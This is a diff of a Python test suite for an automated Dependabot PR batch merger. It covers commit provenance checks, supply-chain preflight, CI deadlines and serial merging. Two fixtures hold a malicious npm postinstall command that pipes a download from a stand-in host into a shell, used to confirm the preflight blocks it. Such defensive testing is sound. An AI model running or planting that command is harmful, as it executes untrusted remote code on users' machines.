@@ -154,6 +154,20 @@ class SelectorAndTrustTests(unittest.TestCase):
         self.assertEqual(parsed.author_login, "dependabot[bot]")
         self.assertTrue(batch.trusted_commit(parsed, pr_number=1))
 
+    def test_dependabot_commit_without_explicit_bot_types_is_rejected(self) -> None:
+        commit_snapshot = batch.CommitSnapshot(
+            sha("c"),
+            "Bump package",
+            "dependabot[bot]",
+            "dependabot[bot]",
+            {},
+            None,
+            None,
+            True,
+            (sha("a"),),
+        )
+        self.assertFalse(batch.trusted_commit(commit_snapshot, pr_number=1))
+
     def test_selector_requires_label_and_never_auto_adds_it(self) -> None:
         result = batch.select_pull_requests([pull_request(label=False)])
         self.assertEqual(result.selected, ())
@@ -181,10 +195,22 @@ class SelectorAndTrustTests(unittest.TestCase):
             batch.RepairCommitRecord(
                 1, 42, sha("a"), sha("c"), marker,
                 "github-actions[bot]", "github-actions[bot]",
+                True, batch.make_repair_provenance_marker(1, 42, sha("a"), sha("c")),
             )
         ]
-        self.assertTrue(batch.trusted_commit(trusted, pr_number=1, repair_chain=chain))
+        provenance = batch.RepairProvenanceRecord(
+            10,
+            chain[0].provenance_marker,
+            1,
+            42,
+            sha("a"),
+            sha("c"),
+            "github-actions[bot]",
+            batch.build_repair_provenance_body(chain[0]),
+        )
+        self.assertTrue(batch.trusted_commit(trusted, pr_number=1, repair_chain=chain, repair_provenance=[provenance]))
         self.assertFalse(batch.trusted_commit(trusted, pr_number=1))
+        self.assertFalse(batch.trusted_commit(trusted, pr_number=1, repair_chain=chain))
         forged = batch.CommitSnapshot(
             sha("d"), f"fix\n\n{batch.FIX_TRAILER}: {marker}", "u7chan", "github-actions[bot]", {}, "User", "Bot", True, (sha("a"),)
         )
@@ -218,6 +244,66 @@ class SelectorAndTrustTests(unittest.TestCase):
             (sha("a"),),
         )
         self.assertFalse(batch.trusted_commit(external, pr_number=1))
+
+    def test_forged_repair_record_alone_cannot_establish_provenance(self) -> None:
+        marker = batch.make_fix_marker(1, sha("a"), 42)
+        commit_snapshot = batch.CommitSnapshot(
+            sha("c"),
+            f"fix\n\n{batch.FIX_TRAILER}: {marker}",
+            "github-actions[bot]",
+            "github-actions[bot]",
+            {},
+            "Bot",
+            "Bot",
+            True,
+            (sha("a"),),
+        )
+        forged = batch.RepairCommitRecord(
+            1, 42, sha("a"), sha("c"), marker,
+            "github-actions[bot]", "github-actions[bot]",
+            True, batch.make_repair_provenance_marker(1, 42, sha("a"), sha("c")),
+        )
+        self.assertFalse(batch.trusted_commit(commit_snapshot, pr_number=1, repair_chain=[forged]))
+
+    def test_repair_provenance_parser_rejects_replay_or_wrong_context(self) -> None:
+        marker = batch.make_fix_marker(1, sha("a"), 42)
+        record = batch.RepairCommitRecord(
+            1, 42, sha("a"), sha("c"), marker,
+            "github-actions[bot]", "github-actions[bot]",
+            True, batch.make_repair_provenance_marker(1, 42, sha("a"), sha("c")),
+        )
+        body = batch.build_repair_provenance_body(record)
+        parsed = batch.parse_repair_provenance_record(50, body)
+        self.assertIsNotNone(parsed)
+        self.assertIsNone(batch.parse_repair_provenance_record(50, body.replace(f"- run: {42}", "- run: 43")))
+        self.assertIsNone(batch.parse_repair_provenance_record(0, body))
+
+    def test_repair_chain_rejects_wrong_parent_run_pr_actor_or_marker(self) -> None:
+        marker = batch.make_fix_marker(1, sha("a"), 42)
+        record = batch.RepairCommitRecord(
+            1, 42, sha("a"), sha("c"), marker,
+            "github-actions[bot]", "github-actions[bot]",
+            True, batch.make_repair_provenance_marker(1, 42, sha("a"), sha("c")),
+        )
+        commit_snapshot = batch.CommitSnapshot(
+            sha("c"), f"fix\n\n{batch.FIX_TRAILER}: {marker}",
+            "github-actions[bot]", "github-actions[bot]", {}, "Bot", "Bot", True, (sha("a"),)
+        )
+        provenance = batch.RepairProvenanceRecord(
+            51, record.provenance_marker, 1, 42, sha("a"), sha("c"),
+            "github-actions[bot]", batch.build_repair_provenance_body(record),
+        )
+        self.assertTrue(batch.trusted_commit(commit_snapshot, pr_number=1, repair_chain=[record], repair_provenance=[provenance]))
+        bad_records = (
+            batch.RepairCommitRecord(1, 42, sha("b"), sha("c"), marker, "github-actions[bot]", "github-actions[bot]", True, record.provenance_marker),
+            batch.RepairCommitRecord(1, 43, sha("a"), sha("c"), marker, "github-actions[bot]", "github-actions[bot]", True, record.provenance_marker),
+            batch.RepairCommitRecord(2, 42, sha("a"), sha("c"), marker, "github-actions[bot]", "github-actions[bot]", True, record.provenance_marker),
+            batch.RepairCommitRecord(1, 42, sha("a"), sha("c"), marker, "other-bot[bot]", "other-bot[bot]", True, record.provenance_marker),
+            batch.RepairCommitRecord(1, 42, sha("a"), sha("c"), "wrong-marker", "github-actions[bot]", "github-actions[bot]", True, record.provenance_marker),
+        )
+        for bad in bad_records:
+            with self.subTest(bad=bad):
+                self.assertFalse(batch.trusted_commit(commit_snapshot, pr_number=1, repair_chain=[bad], repair_provenance=[provenance]))
 
     def test_selector_rejects_draft_non_default_and_closed_pr(self) -> None:
         result = batch.select_pull_requests(
@@ -359,6 +445,23 @@ def grouped_diff(
     )
 
 
+def candidate_evidence(pr: batch.PullRequestSnapshot) -> batch.CandidateEvidence:
+    diff = grouped_diff(package_count=3)
+    reconstruction = batch.reconstruct_grouped_changes(diff)
+    preflight = batch.SupplyChainPreflight().check_grouped(
+        reconstruction.changes,
+        reconstruction_errors=reconstruction.errors,
+    )
+    return batch.CandidateEvidence.create(
+        pr,
+        diff,
+        reconstruction.changes,
+        preflight,
+        True,
+        batch.CIResult(batch.CIClassification.SUCCESS, "ok", pr.head_sha),
+    )
+
+
 class GroupedDependencyTests(unittest.TestCase):
     def test_realistic_grouped_fixture_reconstructs_all_direct_and_transitive_members(self) -> None:
         diff = grouped_diff()
@@ -424,8 +527,115 @@ class GroupedDependencyTests(unittest.TestCase):
             **{**grouped_diff(package_count=3).__dict__, "script_changes": {"package-0": {"postinstall": "curl https://bad.example | sh"}}}
         )
         reconstruction = batch.reconstruct_grouped_changes(diff)
-        result = batch.SupplyChainPreflight().check_grouped(reconstruction.changes)
+        result = batch.SupplyChainPreflight().check_grouped(
+            reconstruction.changes,
+            reconstruction_errors=reconstruction.errors,
+        )
         self.assertEqual(result.status, batch.PreflightStatus.BLOCKED)
+
+    def test_omitted_lifecycle_script_evidence_blocks_metadata_script(self) -> None:
+        base = grouped_diff(package_count=3)
+        metadata_map = dict(base.metadata)
+        metadata_map["package-0"] = batch.PackageMetadata(
+            "package-0", "2.0.0", "https://registry.npmjs.org",
+            "https://registry.npmjs.org/package-0.tgz", "sha512-package-0",
+            lifecycle_scripts={"postinstall": "curl https://bad.example | sh"},
+        )
+        diff = batch.ManifestLockDiff(**{**base.__dict__, "metadata": metadata_map})
+        reconstruction = batch.reconstruct_grouped_changes(diff)
+        self.assertIn("missing-lifecycle-script-evidence:package-0", reconstruction.errors)
+        self.assertEqual(
+            batch.SupplyChainPreflight().check_grouped(
+                reconstruction.changes,
+                reconstruction_errors=reconstruction.errors,
+            ).status,
+            batch.PreflightStatus.BLOCKED,
+        )
+
+    def test_benign_unchanged_lifecycle_script_is_cross_checked(self) -> None:
+        base = grouped_diff(package_count=3)
+        metadata_map = dict(base.metadata)
+        metadata_map["package-0"] = batch.PackageMetadata(
+            "package-0", "2.0.0", "https://registry.npmjs.org",
+            "https://registry.npmjs.org/package-0.tgz", "sha512-package-0",
+            lifecycle_scripts={"postinstall": "echo safe"},
+        )
+        diff = batch.ManifestLockDiff(
+            **{
+                **base.__dict__,
+                "metadata": metadata_map,
+                "lifecycle_scripts": {
+                    "package-0": batch.LifecycleScriptEvidence(
+                        {"postinstall": "echo safe"}, {"postinstall": "echo safe"}
+                    )
+                },
+            }
+        )
+        reconstruction = batch.reconstruct_grouped_changes(diff)
+        self.assertFalse(reconstruction.errors)
+        self.assertTrue(
+            batch.SupplyChainPreflight().check_grouped(
+                reconstruction.changes,
+                reconstruction_errors=reconstruction.errors,
+            ).complete
+        )
+
+    def test_added_and_removed_lifecycle_scripts_are_verified(self) -> None:
+        base = grouped_diff(package_count=3)
+        metadata_map = dict(base.metadata)
+        metadata_map["package-0"] = batch.PackageMetadata(
+            "package-0", "2.0.0", "https://registry.npmjs.org",
+            "https://registry.npmjs.org/package-0.tgz", "sha512-package-0",
+            lifecycle_scripts={"postinstall": "echo safe"},
+        )
+        added = batch.ManifestLockDiff(
+            **{
+                **base.__dict__,
+                "metadata": metadata_map,
+                "script_changes": {"package-0": {"postinstall": "echo safe"}},
+                "lifecycle_scripts": {
+                    "package-0": batch.LifecycleScriptEvidence({}, {"postinstall": "echo safe"})
+                },
+            }
+        )
+        added_reconstruction = batch.reconstruct_grouped_changes(added)
+        self.assertFalse(added_reconstruction.errors)
+
+        removed_metadata = dict(base.metadata)
+        removed = batch.ManifestLockDiff(
+            **{
+                **base.__dict__,
+                "metadata": removed_metadata,
+                "lifecycle_scripts": {
+                    "package-0": batch.LifecycleScriptEvidence({"postinstall": "echo safe"}, {})
+                },
+            }
+        )
+        removed_reconstruction = batch.reconstruct_grouped_changes(removed)
+        self.assertFalse(removed_reconstruction.errors)
+
+    def test_lifecycle_metadata_and_diff_inconsistency_blocks(self) -> None:
+        base = grouped_diff(package_count=3)
+        metadata_map = dict(base.metadata)
+        metadata_map["package-0"] = batch.PackageMetadata(
+            "package-0", "2.0.0", "https://registry.npmjs.org",
+            "https://registry.npmjs.org/package-0.tgz", "sha512-package-0",
+            lifecycle_scripts={"postinstall": "echo actual"},
+        )
+        diff = batch.ManifestLockDiff(
+            **{
+                **base.__dict__,
+                "metadata": metadata_map,
+                "script_changes": {"package-0": {"postinstall": "echo changed"}},
+                "lifecycle_scripts": {
+                    "package-0": batch.LifecycleScriptEvidence({}, {"postinstall": "echo changed"})
+                },
+            }
+        )
+        reconstruction = batch.reconstruct_grouped_changes(diff)
+        self.assertTrue(
+            any("lifecycle-script-metadata-mismatch:package-0" in item for item in reconstruction.errors)
+        )
 
     def test_head_drift_after_preflight_discards_old_judgement(self) -> None:
         expected = pull_request()
@@ -836,6 +1046,65 @@ class FootprintAndCITests(unittest.TestCase):
         self.assertEqual(result.classification, batch.CIClassification.TIMEOUT)
         self.assertEqual(batch.disposition_for(classification=result.classification.value), "open")
 
+    def test_ci_deadline_is_checked_after_observation_before_transient_rerun(self) -> None:
+        class Clock:
+            def __init__(self) -> None:
+                self.now = 0.0
+
+            def monotonic(self) -> float:
+                return self.now
+
+            def sleep(self, seconds: float) -> None:
+                self.now += seconds
+
+        clock = Clock()
+        reruns: list[str] = []
+
+        def observe(_: str) -> batch.CIObservation:
+            clock.now = 31
+            return batch.CIObservation(
+                sha("a"),
+                (batch.CheckObservation("ci", "completed", "failure"),),
+                failure_code="runner-failure",
+            )
+
+        result = batch.CIWaiter(clock, deadline_seconds=30).wait(
+            sha("a"), observe, lambda _: reruns.append("rerun"),
+            gate=batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs")),
+        )
+        self.assertEqual(result.classification, batch.CIClassification.TIMEOUT)
+        self.assertEqual(reruns, [])
+
+    def test_ci_deadline_checks_success_at_exact_boundary_and_just_over(self) -> None:
+        class Clock:
+            def __init__(self, observed: float) -> None:
+                self.now = 0.0
+                self.observed = observed
+
+            def monotonic(self) -> float:
+                return self.now
+
+            def sleep(self, seconds: float) -> None:
+                self.now += seconds
+
+        def run(observed: float) -> batch.CIResult:
+            clock = Clock(observed)
+
+            def observe(_: str) -> batch.CIObservation:
+                clock.now = observed
+                return batch.CIObservation(
+                    sha("a"),
+                    (batch.CheckObservation("ci", "completed", "success"),),
+                )
+
+            return batch.CIWaiter(clock, deadline_seconds=30).wait(
+                sha("a"), observe, lambda _: None,
+                gate=batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs")),
+            )
+
+        self.assertEqual(run(30).classification, batch.CIClassification.TIMEOUT)
+        self.assertEqual(run(30.001).classification, batch.CIClassification.TIMEOUT)
+
 
 class CycleMergeAndTOCTOUTests(unittest.TestCase):
     def test_repair_controller_is_bounded_at_two_cycles(self) -> None:
@@ -848,7 +1117,7 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
             return batch.FixCommit(
                 sha("c" if not commits else "d"), message, marker,
                 1, 7, parent, "github-actions[bot]", "github-actions[bot]",
-                True, (parent,), True,
+                True, (parent,), True, "Bot", "Bot",
             )
 
         def push(_: str, new: batch.FixCommit) -> None:
@@ -863,6 +1132,16 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
             create_commit=create,
             push=push,
             wait_for_ci=lambda _: batch.CIResult(batch.CIClassification.DEPENDENCY_CAUSED, "still fails", sha("a")),
+            record_provenance=lambda record: batch.RepairProvenanceRecord(
+                100 + len(controller.repair_provenance),
+                record.provenance_marker,
+                record.pr_number,
+                record.run_id,
+                record.parent_sha,
+                record.commit_sha,
+                record.author_login,
+                batch.build_repair_provenance_body(record),
+            ),
         )
         self.assertEqual(result.cycles, 2)
         self.assertEqual(len(result.commits), 2)
@@ -879,7 +1158,14 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
             first.verification_verified,
             first.parents,
         )
-        self.assertTrue(batch.trusted_commit(observed, pr_number=1, repair_chain=controller.repair_chain))
+        self.assertTrue(
+            batch.trusted_commit(
+                observed,
+                pr_number=1,
+                repair_chain=controller.repair_chain,
+                repair_provenance=controller.repair_provenance,
+            )
+        )
 
     def test_repair_controller_does_not_commit_after_head_drift(self) -> None:
         gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
@@ -946,7 +1232,7 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
         merge_calls: list[int] = []
         cd_calls: list[str] = []
         result = batch.SerialMerger(gate).merge_in_order(
-            prs,
+            tuple(candidate_evidence(pr) for pr in prs),
             refetch=lambda number: current[number],
             ci_success_for_head=lambda _: True,
             merge=lambda head: merge_calls.append(1) or sha("f"),
@@ -961,7 +1247,7 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
         gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
         merged: list[int] = []
         result = batch.SerialMerger(gate).merge_in_order(
-            prs,
+            tuple(candidate_evidence(pr) for pr in prs),
             refetch=lambda number: prs[number - 1],
             ci_success_for_head=lambda _: True,
             merge=lambda _: merged.append(1) or sha("f"),
@@ -981,13 +1267,13 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
         merged: list[str] = []
         gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
         result = batch.SerialMerger(gate).merge_in_order(
-            (expected,),
+            (candidate_evidence(expected),),
             refetch=lambda _: next(reads),
             ci_success_for_head=lambda head: revalidated.append(("ci", head)) or True,
             merge=lambda head: merged.append(head) or sha("f"),
             wait_for_cd=lambda _: True,
             update_branch=lambda number, head, base: updates.append((number, head, base)) or updated,
-            revalidate=lambda pr: revalidated.append((pr.head_sha, pr.base_sha)) or True,
+            revalidate=lambda pr: revalidated.append((pr.head_sha, pr.base_sha)) or candidate_evidence(updated),
         )
         self.assertEqual(updates, [(1, sha("b"), sha("c"))])
         self.assertEqual(revalidated, [(sha("d"), sha("c")), ("ci", sha("d"))])
@@ -1000,16 +1286,32 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
         merged: list[str] = []
         gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
         result = batch.SerialMerger(gate).merge_in_order(
-            (expected,),
+            (candidate_evidence(expected),),
             refetch=lambda _: changed_base,
             ci_success_for_head=lambda _: (_ for _ in ()).throw(AssertionError("stale CI must not run")),
             merge=lambda head: merged.append(head) or sha("f"),
             wait_for_cd=lambda _: True,
             update_branch=lambda *_: pull_request(1, base_sha=sha("c"), head_sha=sha("b")),
-            revalidate=lambda _: True,
+            revalidate=lambda _: None,
         )
         self.assertEqual(merged, [])
         self.assertEqual(result[0].status, batch.Status.OPEN.value)
+        self.assertEqual(result[0].reason, "base-freshness-update-failed")
+
+    def test_base_update_rejects_revalidation_evidence_tied_to_old_head_or_members(self) -> None:
+        expected = pull_request(1, base_sha=sha("a"), head_sha=sha("b"))
+        changed_base = pull_request(1, base_sha=sha("c"), head_sha=sha("b"))
+        updated = pull_request(1, base_sha=sha("c"), head_sha=sha("d"))
+        gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
+        result = batch.SerialMerger(gate).merge_in_order(
+            (candidate_evidence(expected),),
+            refetch=lambda _: changed_base,
+            ci_success_for_head=lambda _: True,
+            merge=lambda _: (_ for _ in ()).throw(AssertionError("stale evidence must not merge")),
+            wait_for_cd=lambda _: True,
+            update_branch=lambda *_: updated,
+            revalidate=lambda _: candidate_evidence(expected),
+        )
         self.assertEqual(result[0].reason, "base-freshness-update-failed")
 
     def test_base_drift_is_revalidated_for_later_pr_after_first_merge(self) -> None:
@@ -1033,13 +1335,13 @@ class CycleMergeAndTOCTOUTests(unittest.TestCase):
 
         gate = batch.MutationGate(batch.evaluate_authorization("process Dependabot PRs"))
         result = batch.SerialMerger(gate).merge_in_order(
-            (first, second),
+            tuple(candidate_evidence(pr) for pr in (first, second)),
             refetch=refetch,
             ci_success_for_head=lambda _: True,
             merge=lambda _: sha("f"),
             wait_for_cd=lambda _: True,
             update_branch=update,
-            revalidate=lambda pr: revalidated.append(pr.number) or True,
+            revalidate=lambda pr: revalidated.append(pr.number) or candidate_evidence(refreshed_second),
         )
         self.assertEqual([item.status for item in result], [batch.Status.SUCCESS.value] * 2)
         self.assertEqual(updates, [(2, sha("c"), sha("d"))])
@@ -1056,6 +1358,9 @@ class FakeBatchAdapter:
         missing_first_member: bool = False,
         drift_kind: str | None = None,
         local_failure: bool = False,
+        advance_base_on_merge: bool = False,
+        supply_chain_refusal: bool = False,
+        independent_footprints: bool = False,
     ) -> None:
         self.events: list[str] = []
         self.mutations: list[str] = []
@@ -1063,7 +1368,16 @@ class FakeBatchAdapter:
         self.missing_first_member = missing_first_member
         self.drift_kind = drift_kind
         self.local_failure = local_failure
-        self.prs = [pull_request(1), pull_request(2, head_sha=sha("c"))]
+        self.advance_base_on_merge = advance_base_on_merge
+        self.supply_chain_refusal = supply_chain_refusal
+        self.independent_footprints = independent_footprints
+        self.active_matrix = 0
+        self.max_active_matrix = 0
+        self.matrix_lock = threading.Lock()
+        self.base_advanced = False
+        self.updated_diff = False
+        second_files = ("projects/portfolio/package.json",) if independent_footprints else ("projects/portal/package.json",)
+        self.prs = [pull_request(1), pull_request(2, head_sha=sha("c"), changed_files=second_files)]
         self.current = {pr.number: pr for pr in self.prs}
 
     def read_pull_requests(self):
@@ -1074,9 +1388,19 @@ class FakeBatchAdapter:
         self.events.append(f"read-chain:{pr.number}")
         return ()
 
+    def read_repair_provenance(self, pr):
+        self.events.append(f"read-provenance:{pr.number}")
+        return ()
+
     def read_dependency_diff(self, pr):
         self.events.append(f"preflight-read:{pr.number}")
-        return grouped_diff(missing_metadata="package-2" if self.missing_first_member and pr.number == 1 else None, package_count=3)
+        diff = grouped_diff(
+            missing_metadata="package-2" if self.missing_first_member and pr.number == 1 else None,
+            package_count=4 if self.updated_diff else 3,
+        )
+        if self.supply_chain_refusal:
+            diff = batch.ManifestLockDiff(**{**diff.__dict__, "source_types": {"package-0": "git"}})
+        return diff
 
     def footprint(self, pr, diff):
         self.events.append(f"footprint:{pr.number}")
@@ -1084,6 +1408,12 @@ class FakeBatchAdapter:
 
     def run_matrix_and_docker(self, pr, changes):
         self.events.append(f"matrix-docker:{pr.number}")
+        with self.matrix_lock:
+            self.active_matrix += 1
+            self.max_active_matrix = max(self.max_active_matrix, self.active_matrix)
+        time.sleep(0.01)
+        with self.matrix_lock:
+            self.active_matrix -= 1
         return not self.local_failure
 
     def observe_ci(self, expected_head_sha):
@@ -1119,12 +1449,25 @@ class FakeBatchAdapter:
     def create_fix_commit(self, pr, diagnosis, marker, message):
         return batch.FixCommit(
             sha("d"), message, marker, pr.number, 7, pr.head_sha,
-            "github-actions[bot]", "github-actions[bot]", True, (pr.head_sha,), True,
+            "github-actions[bot]", "github-actions[bot]", True, (pr.head_sha,), True, "Bot", "Bot",
         )
 
     def push_fix(self, pr, expected_head_sha, commit):
         self.mutations.append(f"push:{pr.number}")
         self.current[pr.number] = batch.PullRequestSnapshot(**{**self.current[pr.number].__dict__, "head_sha": commit.sha})
+
+    def record_repair_provenance(self, pr, record):
+        self.mutations.append(f"provenance:{pr.number}")
+        return batch.RepairProvenanceRecord(
+            900 + pr.number,
+            record.provenance_marker,
+            record.pr_number,
+            record.run_id,
+            record.parent_sha,
+            record.commit_sha,
+            record.author_login,
+            batch.build_repair_provenance_body(record),
+        )
 
     def read_current_pr(self, number):
         self.events.append(f"read-current:{number}")
@@ -1133,6 +1476,8 @@ class FakeBatchAdapter:
             return batch.PullRequestSnapshot(**{**current.__dict__, "head_sha": sha("e")})
         if self.drift_kind == "base":
             return batch.PullRequestSnapshot(**{**current.__dict__, "base_sha": sha("d")})
+        if self.base_advanced and number == 2 and current.base_sha == sha("a"):
+            return batch.PullRequestSnapshot(**{**current.__dict__, "base_sha": sha("d")})
         return current
 
     def update_branch(self, number, expected_head_sha, expected_base_sha):
@@ -1140,6 +1485,7 @@ class FakeBatchAdapter:
         old = self.current[number]
         updated = batch.PullRequestSnapshot(**{**old.__dict__, "head_sha": sha("e"), "base_sha": expected_base_sha})
         self.current[number] = updated
+        self.updated_diff = True
         return updated
 
     def rebuild_snapshot(self, pr):
@@ -1155,6 +1501,8 @@ class FakeBatchAdapter:
 
     def merge_pr(self, number, expected_head_sha):
         self.mutations.append(f"merge:{number}:{expected_head_sha}")
+        if self.advance_base_on_merge:
+            self.base_advanced = True
         return sha("f")
 
     def wait_for_cd(self, merge_sha):
@@ -1179,7 +1527,7 @@ class FakeBatchAdapter:
 
     def create_followup_issue(self, body):
         self.mutations.append("issue-create")
-        return batch.IssueRecord(100, "open", body)
+        return batch.IssueRecord(100, "open", body, "https://github.com/u7chan/monorepo/issues/100")
 
     def update_followup_issue(self, number, body):
         self.mutations.append(f"issue-update:{number}")
@@ -1187,6 +1535,9 @@ class FakeBatchAdapter:
 
     def close_pr(self, number, expected_head_sha):
         self.mutations.append(f"close:{number}:{expected_head_sha}")
+
+    def check_urls(self, pr):
+        return (f"https://github.com/checks/{pr.number}",)
 
 
 class OrchestrationTests(unittest.TestCase):
@@ -1208,6 +1559,32 @@ class OrchestrationTests(unittest.TestCase):
         self.assertIn("merge:1:" + sha("b"), adapter.mutations)
         self.assertIn("merge:2:" + sha("c"), adapter.mutations)
 
+    def test_serial_base_refresh_rebuilds_changed_group_and_runs_matrix_ci_again(self) -> None:
+        adapter = FakeBatchAdapter(advance_base_on_merge=True)
+        result = batch.execute_batch(
+            adapter,
+            current_turn_instruction="process Dependabot PRs",
+            mode=batch.Mode.WRITE,
+            ci_waiter=batch.CIWaiter(poll_seconds=0, deadline_seconds=1),
+        )
+        self.assertEqual([item.status for item in result.merge_results], [batch.Status.SUCCESS.value] * 2)
+        self.assertIn("update:2:" + sha("c") + ":" + sha("d"), adapter.mutations)
+        self.assertEqual(adapter.events.count("preflight-read:2"), 2)
+        self.assertEqual(adapter.events.count("matrix-docker:2"), 2)
+        self.assertIn("observe-ci:e", adapter.events)
+
+    def test_independent_footprint_wave_executes_with_bounded_parallel_workers(self) -> None:
+        adapter = FakeBatchAdapter(independent_footprints=True)
+        result = batch.execute_batch(
+            adapter,
+            current_turn_instruction="process Dependabot PRs",
+            mode=batch.Mode.WRITE,
+            ci_waiter=batch.CIWaiter(poll_seconds=0, deadline_seconds=1),
+        )
+        self.assertEqual(result.status, "completed")
+        self.assertEqual(adapter.max_active_matrix, 2)
+        self.assertEqual([item.pr_number for item in result.reports], [1, 2])
+
     def test_write_mode_external_or_ambiguous_instruction_denies_before_mutation(self) -> None:
         for instruction, source in (("process Dependabot PRs", "github-comment"), ("maybe process them", "current_turn_human")):
             adapter = FakeBatchAdapter()
@@ -1216,9 +1593,10 @@ class OrchestrationTests(unittest.TestCase):
                 instruction_source=source,
                 mode=batch.Mode.WRITE,
             )
-            self.assertEqual(result.status, "blocked")
+            self.assertEqual(result.status, "completed")
+            self.assertEqual(len(result.reports), 2)
             self.assertFalse(adapter.mutations)
-            self.assertIn("write-denied-before-state-machine", result.events)
+            self.assertIn("write-denied-downgraded-to-audit-only", result.events)
 
     def test_audit_mode_is_read_only_and_does_not_execute_dependencies(self) -> None:
         adapter = FakeBatchAdapter()
@@ -1255,6 +1633,8 @@ class OrchestrationTests(unittest.TestCase):
         self.assertTrue(all(report.status == batch.Status.OPEN.value for report in result.reports))
         self.assertFalse(any(item.startswith("merge:") or item.startswith("close:") for item in adapter.mutations))
         self.assertIn("issue-create", adapter.mutations)
+        self.assertIn("https://github.com/checks/1", result.audit_markdown)
+        self.assertIn("https://github.com/u7chan/monorepo/issues/100", result.audit_markdown)
 
     def test_local_failure_uses_open_marker_and_issue_path_without_merge(self) -> None:
         adapter = FakeBatchAdapter(local_failure=True)
@@ -1267,6 +1647,18 @@ class OrchestrationTests(unittest.TestCase):
         self.assertIn("comment:1", adapter.mutations)
         self.assertIn("issue-create", adapter.mutations)
         self.assertFalse(any(item.startswith("merge:") or item.startswith("close:") for item in adapter.mutations))
+
+    def test_clear_supply_chain_refusal_comments_and_closes_without_dependency_execution(self) -> None:
+        adapter = FakeBatchAdapter(supply_chain_refusal=True)
+        result = batch.execute_batch(
+            adapter,
+            current_turn_instruction="process Dependabot PRs",
+            mode=batch.Mode.WRITE,
+        )
+        self.assertTrue(all(report.status == batch.Status.CLOSED.value for report in result.reports))
+        self.assertIn("comment:1", adapter.mutations)
+        self.assertIn("close:1:" + sha("b"), adapter.mutations)
+        self.assertNotIn("matrix-docker:1", adapter.events)
 
     def test_dependency_failure_with_no_fix_closes_only_after_comment_and_keeps_no_merge(self) -> None:
         adapter = FakeBatchAdapter(ci_mode="dependency")
@@ -1317,6 +1709,25 @@ class IdempotencyIssueAndAuditTests(unittest.TestCase):
                 batch.RepairCommitRecord(
                     1, 1, pr.head_sha, sha("c"), fix_marker,
                     "github-actions[bot]", "github-actions[bot]",
+                    True, batch.make_repair_provenance_marker(1, 1, pr.head_sha, sha("c")),
+                )
+            ],
+            repair_provenance=[
+                batch.RepairProvenanceRecord(
+                    30,
+                    batch.make_repair_provenance_marker(1, 1, pr.head_sha, sha("c")),
+                    1,
+                    1,
+                    pr.head_sha,
+                    sha("c"),
+                    "github-actions[bot]",
+                    batch.build_repair_provenance_body(
+                        batch.RepairCommitRecord(
+                            1, 1, pr.head_sha, sha("c"), fix_marker,
+                            "github-actions[bot]", "github-actions[bot]",
+                            True, batch.make_repair_provenance_marker(1, 1, pr.head_sha, sha("c")),
+                        )
+                    ),
                 )
             ],
         )
